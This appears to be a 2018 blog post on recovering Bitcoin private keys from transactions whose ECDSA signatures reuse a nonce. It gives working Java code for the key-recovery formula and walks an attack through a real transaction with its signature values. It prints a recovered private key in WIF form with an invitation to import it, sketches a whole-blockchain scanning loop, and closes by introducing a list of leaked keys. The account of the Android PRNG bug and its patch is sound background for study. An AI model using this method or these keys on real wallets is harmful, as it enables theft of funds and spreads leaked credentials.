+++
title = "Bitcoin transaction nonce reuse vulnerability"
author = ["OPSXCQ"]
date = 2018-08-09
draft = false
+++

This study aims to analyse a cryptographic attack against the Bitcoin
blockchain. During this exploration were Found **123 vulnerable transactions** and
**416 private keys** were recovered summing up **26.85729198 btcs** (2685729198
satoshis) could have been compromised, which at this exact moment worth
**166,219.51 dollars**.

<!--more-->

{{< figure src="/ox-hugo/bitcoin-nonce-reuse-wallet.png" >}}


## Cryptographic concept of the attack {#cryptographic-concept-of-the-attack}

When the nonce is reused it become vulnerable and result in a trivial equation
to be solved.

\\[
Key=((r \times (s\_1 - s\_2))^{p - 2} \mod{p}) \times ((m\_1 \times s\_2) - (m\_2 \times s\_1)) \mod{p}
\\]

Where:

-   \\(p\\) Is a constant value defined by the \\(n\\) value of [secp256k1](https://en.bitcoin.it/wiki/Secp256k1):
    \\(115792089237316195423570985008687907852837564279074904382605163141518161494337\\)
-   \\(r\\) and \\(s\\) which are the [ECDSA signature pair](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm).
-   \\(m\\) is the message to be signed, in this scenario, is the value that [OP_CHECKSIG will verify](https://en.bitcoin.it/wiki/OP_CHECKSIG)

Translating this equation as **Java** code it looks like:

```java
String pValue = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";
BigInteger p = new BigInteger(pValue, 16);
BigInteger privateKey =
r.multiply(
           s1.subtract(s2)
          ).modPow(
                   p.subtract(BigInteger.valueOf(2)), p
                  ).
          multiply(
                   m1.multiply(s2).subtract(m2.multiply(s1))
                  ).mod(p);
```


## Attacking an transaction {#attacking-an-transaction}

To illustrate the attack we will use the transaction
`89380c9fb072cbb5af43428788edfd000f2c9c0e1f8649e436d255270e331b02` as example,
which sent `0.00075095` BTC from `1FaapwdwYVVBiV6Qvkis88c2KHPoxX1Jb1`,
`14Er6oawkdH62W7GcpLRr5ds6HoFiPrLRY` and `1LTA33Wv6Ptg2Co9trERLeMEp2AbEL4Bo4` to
`17nQuSuoDDGaXcvaExNpre5v7bKEtywG3N`.

The chosen address to be attacked `1FaapwdwYVVBiV6Qvkis88c2KHPoxX1Jb1`.

Bellow the variables:

```python
R=6819641642398093696120236467967538361543858578256722584730163952555838220871
S1=5111069398017465712735164463809304352000044522184731945150717785434666956473
M1=4834837306435966184874350434501389872155834069808640791394730023708942795899
S2=31133511789966193434473156682648022965280901634950536313584626906865295404159
M2=108808786585075507407446857551522706228868950080801424952567576192808212665067
```

Running the algorithm against those values it split gives the value of the
private key
\\(35027840177330064405683178523079910253772859809146826320797401203281604260438\\).

This key converted in `WIF` format is
`KypFJ5YhPwyDV7SKiQCwmHJkjZdHVz6hmb5UcVn7eaHR5pBByLvx`. Just import it in your
wallet and check it.


## Vulnerability {#vulnerability}

This vulnerability relies on a poor choice for a random number while signing the
message on the ECDSA system. A similar vulnerability found on [PS3](https://events.ccc.de/congress/2010/Fahrplan/attachments/1780_27c3_console_hacking_2010.pdf) in 2010.

In 2013 a smart hacker knowing about this launched an attack against the Bitcoin
transactions. Due to a bug on Androidâ€™s PRNG that made it not being initialized
correctly, transactions with more than one input reused the same \\(k\\) as the
random value for the signature, which can be detected by simply finding a
duplicate \\(r\\) value in the signatures of a transaction.

The bug was found in [SHA1PRNG_SecureRandomImpl](https://android.googlesource.com/platform/libcore/+/kitkat-release/luni/src/main/java/org/apache/harmony/security/provider/crypto/SHA1PRNG_SecureRandomImpl.java#294) class when not properly
initialized the `engineNextBytes` function in the `SecureRandom` implementation in
**Apache Harmony** 6.0M3, as used in the Java Cryptography Architecture (JCA) on
Android before 4.4 and other products, when **no seed is provided** by the user, it
uses an incorrect offset value which makes it easier for attackers to defeat
cryptographic protection mechanisms by leveraging the resulting PRNG
predictability.


### Patch {#patch}

The commit fixing this vulnerability can be found [here](https://android.googlesource.com/platform/libcore/+/ab6d7714b47c04cc4bd812b32e6a6370181a06e4%5E%21/#F0). Bellow the changes that
this commit added to `SHA1PRNG_SecureRandomImpl`:

```diff
@@ -300,6 +300,11 @@
             updateSeed(getRandomBytes(DIGEST_LENGTH));
             nextBIndex = HASHBYTES_TO_USE;

+            // updateSeed(...) updates where the last word of the seed is, so we
+            // have to read it again.
+            lastWord = seed[BYTES_OFFSET] == 0 ? 0
+                    : (seed[BYTES_OFFSET] + extrabytes) >> 3 - 1;
+
         } else if (state == SET_SEED) {

             System.arraycopy(seed, HASH_OFFSET, copies, HASHCOPY_OFFSET,

```


### Exploiting the vulnerability {#exploiting-the-vulnerability}

The rest of the process is pretty straight forward, it can be defined by the
following pseudo-code:

```python
for block in blocks:
    for transaction in block:
        attack(transaction)
```

This is enough to go through all bitcoin transactions in the blockchain and
attack those that have weak signature. During this study several transactions
were collected, these transactions are listed bellow so you don't need to go
through all the trouble of calculating it. In a modest computer this process
takes about 4 hours.


## Private keys {#private-keys}

List of private keys, if you want to check them importing it into your wallet.
Since those keys were already compromised and there are no funds, there is not
ethical problem into leaking them, since the focus of this post is absolutely
educational and no harm is being done by leaking it.
